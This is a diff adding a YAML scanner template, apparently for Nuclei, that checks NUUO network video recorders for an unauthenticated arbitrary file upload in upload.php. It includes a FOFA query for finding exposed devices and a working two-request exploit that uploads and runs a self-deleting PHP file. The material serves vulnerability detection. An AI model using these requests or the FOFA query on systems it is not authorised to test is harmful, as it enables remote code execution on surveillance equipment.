@@ -1,0 +1,47 @@
+id: NUUO-upload_php-File-upload
+
+info:
+  name: "NUUO网络视频录像机 upload.php 未授权任意文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="Network Video Recorder Login"
+      NUUO网络视频录像机 upload.php 接口存在未经身份验证的任意文件上传缺陷，攻击者可通过构造恶意文件上传请求实现WebShell植入，进而获取服务器控制权限。该漏洞允许远程代码执行，可能造成系统敏感数据泄露及服务中断。受影响组件未实施文件类型校验及上传权限控制机制，完整利用链可参考公开漏洞分析报告。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488882&idx=1&sn=6718db6f1c2b3e8d8315f5a38ccc1653&chksm=c267a041f5102957c5696b4c18e9a0319d7f4aa07eb468e7bd41a41ae0673467111b9936a317&token=385896921&lang=zh_CN#rd
+  tags: NUUO网络视频录像机
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /upload.php HTTP/1.1
+    Host: 
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+    Content-Type: multipart/form-data; boundary=--------ok4o88lom
+
+    ----------ok4o88lom
+    Content-Disposition: form-data; name="userfile"; filename="{{username}}.php"
+
+    <?php print(111*222);unlink(__FILE__);?>
+    ----------ok4o88lom--
+  - |
+    GET /{{username}}.php HTTP/1.1
+    Host: 
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
+
+
+
+
